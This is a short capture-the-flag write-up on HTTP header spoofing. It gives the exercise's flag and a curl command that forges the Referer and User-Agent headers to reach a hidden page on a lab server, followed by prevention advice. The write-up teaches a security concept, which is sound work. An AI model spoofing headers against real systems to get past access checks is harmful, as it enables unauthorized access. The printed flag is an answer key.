# Header Spoofing

## 🏴 Flag

```
f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
```

## 📌 Extract

Page: [http://{IP}/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f](http://{ip}}/?page=survey)

In the source code, there are hints to get the flag.

```jsx
<!--You must come from : "https://www.nsa.gov/".--> 
<!--Let's use this browser : "ft_bornToSec". It will help you a lot.-→
```

We just have to change the request header while going into that url.

The first one is the referer, and the second one is the User-Agent

```jsx
curl -H "Referer: https://www.nsa.gov/" -H "User-Agent: ft_bornToSec" "[http://{IP}/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f](http://10.11.248.209/?page=b7e44c7a40c5f80139f0a50f3650fb2bd8d00b0d24667c4c2ca32c88e13b758f)" | grep flag
```

## **🎯 Use**

This vulnerability allows attackers to manipulate HTTP headers to deceive the server into trusting a request. Without proper validation, they can:

- **Bypass security checks** by spoofing trusted referrers or user agents.
- **Access restricted content** by mimicking legitimate requests.
- **Exploit trust relationships** between systems to gain unauthorized access.
- **Perform actions** under the guise of a trusted entity.

## **🔒 Prevention**

1. **Validate Headers:** Always validate and sanitize HTTP headers to ensure they come from trusted sources.
2. **Use Secure Tokens:** Implement secure tokens or signatures to verify the authenticity of requests.
3. **Enforce Strict Policies:** Use strict security policies to limit access based on headers.
4. **Monitor and Log:** Regularly monitor and log header data to detect and respond to suspicious activities.
5. **Limit Trust:** Avoid relying solely on headers for critical security decisions.